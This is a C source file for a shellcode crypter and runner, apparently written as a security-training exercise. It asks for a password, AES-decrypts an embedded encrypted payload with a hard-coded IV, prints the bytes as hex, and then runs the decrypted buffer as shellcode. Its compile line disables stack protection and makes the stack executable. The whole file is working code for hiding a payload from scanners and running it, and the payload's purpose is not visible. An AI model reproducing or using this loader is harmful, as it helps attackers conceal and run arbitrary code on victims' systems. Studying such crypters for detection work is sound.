/*
Filename: hodor-decrypt-run.c
Author: hodorsec
Description: Decrypts a file as input with a given password, outputs in C hex and run the code
Compile with: gcc -fno-stack-protector -z execstack -fno-pie -o hodor-decrypt-run hodor-decrypt-run.c  -lcrypto -I /usr/include/openssl -L /usr/lib/
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/aes.h>
#include <unistd.h>

/* Output encrypted and decrypted */
void print_data(const char *title, const void* data, int len);

/* Do the actual work */
int main(int argc, char **argv)
{
	/* Input */
	const char enc_in[] = \
	"\x5B\xBE\x85\x4B\x14\xC1\xB7\x10\x05\xD4\x84\xA1\x43\xA4\x2F\x01\x0C\x9F\x88\x61\xFA\xD0\x5F\x62\x6F\x7D\xD5\xAF\xFF\x1B\x78\x8A\x3C\xB1\x70\xCB\x92\xB3\x1E\x64\xAF\xEF\xA8\x5E\xFD\xC4\xF3\xD7";
	int lenShell = sizeof(enc_in) - 1;		// Minus NULL-byte
	
	// Variables
	int lenBits = 128;				// AES bits

	// Check password
	char *enterPass = "Enter password to decrypt: ";
	unsigned char *key = (char*)getpass(enterPass);

	// IV
	unsigned char ivDec[AES_BLOCK_SIZE] = "HODORHODORHODOR!"; // 16 bytes

	// Buffers and padding for encryption and decryption
	const size_t lenDec = ((lenShell + AES_BLOCK_SIZE) / AES_BLOCK_SIZE) * AES_BLOCK_SIZE;
	unsigned char shell_dec[lenDec];
	memset(shell_dec, 0, sizeof(shell_dec));

	// Initialize keys
	AES_KEY decKey;
	
	// Decrypt
	// int AES_set_decrypt_key(const unsigned char *userKey, const int bits, AES_KEY *key);
	AES_set_decrypt_key(key, lenBits, &decKey);
	// void AES_cbc_encrypt(const unsigned char *in, unsigned char *out, size_t length, const AES_KEY *key, unsigned char *ivec, const int enc);	
	AES_cbc_encrypt(enc_in, shell_dec, lenDec, &decKey, ivDec, AES_DECRYPT); // AES_DECRYPT == 0 from <openssl/aes.h>
	
	// Output
	print_data("\nENCRYPTED", enc_in, lenShell);
	print_data("\nDECRYPTED", shell_dec, lenDec);
	printf("\n");

	printf("Running shellcode...\n");
    	int (*ret)() = (int(*)())shell_dec;
    	ret();

	return 0;
}

void print_data(const char *title, const void* data, int len)
{
	printf("%s:",title);
	const unsigned char * p = (const unsigned char*)data;
	const unsigned char * q = (const unsigned char*)data;
	int i = 0;		// Counter
	int n = 16;		// Print a newline every N char
	
	printf("\nOneliner:\n\"");

	for (; i < len; ++i) {
		if (*p != '\0') {
			printf("\\x%02X", *p++);
		} else
			break;
	}
	printf("\";\n");
	i = 0;
	printf("\n16-byte newline delimiter:\n\"");

	for (; i < len; ++i) {
		if (*q != '\0') {
			if (i % 16 == 0 && i != 0) {
				printf("\"\\\n\"");
			}
			printf("\\x%02X", *q++);
		} else
			break;
	}
	printf("\";\n");
}

